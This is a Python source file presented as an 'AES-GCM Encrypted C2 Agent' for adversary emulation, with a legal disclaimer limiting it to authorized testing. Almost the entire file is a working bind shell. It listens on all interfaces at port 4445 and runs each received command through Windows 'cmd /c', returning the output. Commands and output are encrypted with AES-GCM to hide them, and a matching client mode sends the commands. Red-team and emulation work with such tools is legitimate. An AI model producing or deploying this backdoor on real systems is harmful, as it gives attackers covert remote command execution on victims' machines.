# ------------------------------------------------------------------
# TITLE:      AES-GCM Encrypted C2 Agent
# AUTHOR:     Ryan D. Johnson
# PURPOSE:    Adversary Emulation
# LEGAL DISCLAIMER: 
#
# 1. NO LIABILITY: In no event shall the author/developer be liable for any 
#    claim, damages, or other liability, whether in an action of contract, tort, or 
#    otherwise, arising from, out of, or in connection with the software or the use or 
#    other dealings in the software.
#
# 2. AUTHORIZED USE ONLY: This tool is intended solely for use on systems you own or 
#    have explicit written permission to test on. Unauthorized access to computer systems 
#    is illegal and punishable by law (e.g., under the Computer Fraud and Abuse Act 
#    - 18 U.S.C. § 1030 in the United States).
#
# 3. RESPONSIBILITY: The end user assumes all responsibility for complying with 
#    applicable local, state, and federal laws. The author accepts no liability for 
#    misuse of this code.

# ------------------------------------------------------------------
import socket, subprocess, threading, argparse, sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# CONFIGURATION
DEFAULT_PORT = 4445
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)

    def encrypt(self, plaintext):
        # AES-GCM Nonce for every packet
        # new cipher object to get a nonce
        cipher = AES.new(self.key, AES.MODE_GCM)
        
        # returns the ciphertext AND the integrity tag
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        
        # Send the Nonce + Tag + Ciphertext so the receiver can decrypt
        return (cipher.nonce + tag + ciphertext).hex()

    def decrypt(self, encrypted_hex):
        try:
            decoded = bytearray.fromhex(encrypted_hex)
            
            # Extract Nonce (16 bytes), Tag (16 bytes), Ciphertext 
            nonce = decoded[:16]
            tag = decoded[16:32]
            ciphertext = decoded[32:]
            
            # Cipher reconstruction
            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
            
            # message integrity
            return cipher.decrypt_and_verify(ciphertext, tag)
        except (ValueError, KeyError):
            return b"Decryption has failed. Integrity check failed."

    def __str__(self):
        return "Key -> {}".format(self.key.hex())

# GLOBAL CIPHER OBJECT
cipher = None

def encrypted_send(s, msg):
    # Encryption/encoding
    try:
        encrypted_data = cipher.encrypt(msg)
        s.send(encrypted_data.encode("latin-1"))
    except Exception as e:
        print(f"Send Error: {e}")

def execute_cmd(cmd):
    try:
        
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Command failed!"
    return output

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
  
    encrypted_send(s, b"[ -- Connection Successful! --]")
    try:
        while True:
           
            encrypted_send(s, b"\r\nEnter Command> ")
            
            data = s.recv(MAX_BUFFER)
            if data:
                # Decrypting incoming command
                buffer = cipher.decrypt(decode_and_strip(data))
                
                # Integrity check
                if b"Integrity check failed" in buffer:
                    encrypted_send(s, b"Error: Integrity check conducted. Result: Failed.\n")
                    continue

                buffer_str = decode_and_strip(buffer)

                if not buffer_str or buffer_str == "exit":
                    s.close()
                    break 
                
                print("> Executing command: '{}'".format(buffer_str))
                encrypted_send(s, execute_cmd(buffer_str))         
            else:
                break
    except:
        s.close()
        exit() 

def send_thread(s):
    try:
        while True: 
            data = input() + "\n"
            # Encode input to bytes before encryption
            encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()

def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                decrypted = cipher.decrypt(data)
                # Decode bytes to string for printing
                print(decrypted.decode("latin-1"), end="", flush=True)
    except:
        s.close()
        exit()

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()
    print(f"[ -- Bind shell initiated on Port {DEFAULT_PORT} -- ]")
    print(f"[ -- ENCRYPTION KEY: {cipher.key.hex()} -- ]")
    print("[ -- IMPORTANT: Key for client connection -- ]")
    
    while True:
        client_socket, addr = s.accept()
        print(" [ -- New user connection active! -- ]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))
    print(" [ -- Connecting to bind shell -- ]")
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--listen", action="store_true", help="bind shell setup", required=False)
parser.add_argument("-c", "--connect", help="Bind shell connection initiated", required=False)
parser.add_argument("-k", "--key", help="Encryption key (Hex)", type=str, required=False)
args = parser.parse_args()

# Key Management 
if args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY!")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher() # Random key generation

if args.listen:
    server()
elif args.connect:
    client(args.connect)
